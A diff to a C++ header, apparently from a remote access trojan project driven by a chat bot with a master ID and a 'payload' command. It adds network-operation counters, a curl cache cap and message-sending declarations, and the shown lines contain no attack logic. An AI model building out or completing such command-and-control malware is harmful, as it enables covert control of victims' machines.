@@ -27,15 +27,21 @@ using BaseBot_uPtr = std::unique_ptr<::rat::tbot::BaseBot>;
 using Bot_uPtr = std::unique_ptr<::rat::tbot::Bot>;
 using CurlClient_uPtr = std::unique_ptr<::rat::networking::Client>;
 
+constexpr uint16_t CURL_CACHE_RESET_BOUND = 10;
 class Handler {
 protected:
   uint32_t sleep_timeout_ms = 500;
   uint32_t empty_updates_count = 0;
 
+  uint16_t bot_net_ops_counter = 0;
+  uint16_t backing_bot_net_ops_counter = 0;
+  uint16_t curl_client_net_ops_counter = 0;
+
 public:
   uint64_t master_id;
   Bot_uPtr bot;
   BaseBot_uPtr backing_bot;
+
   CurlClient_uPtr curl_client;
 
 private:
@@ -162,6 +168,11 @@ private:
   void handlePayloadCommand(void);
   void _dynamicSleep();
 
+  void sendMessage(const std::string &Message_Text);
+  void sendBackingMessage(const std::string &Message_Text);
+
+  void capCurlCache();
+
 public:
   explicit Handler() {
     this->state = {};
@@ -204,4 +215,5 @@ std::vector<std::string> splitArguments(const std::string &Input_String);
 std::string stripQuotes(const std::string &Input_String);
 
 } // namespace handler
+
 } // namespace rat
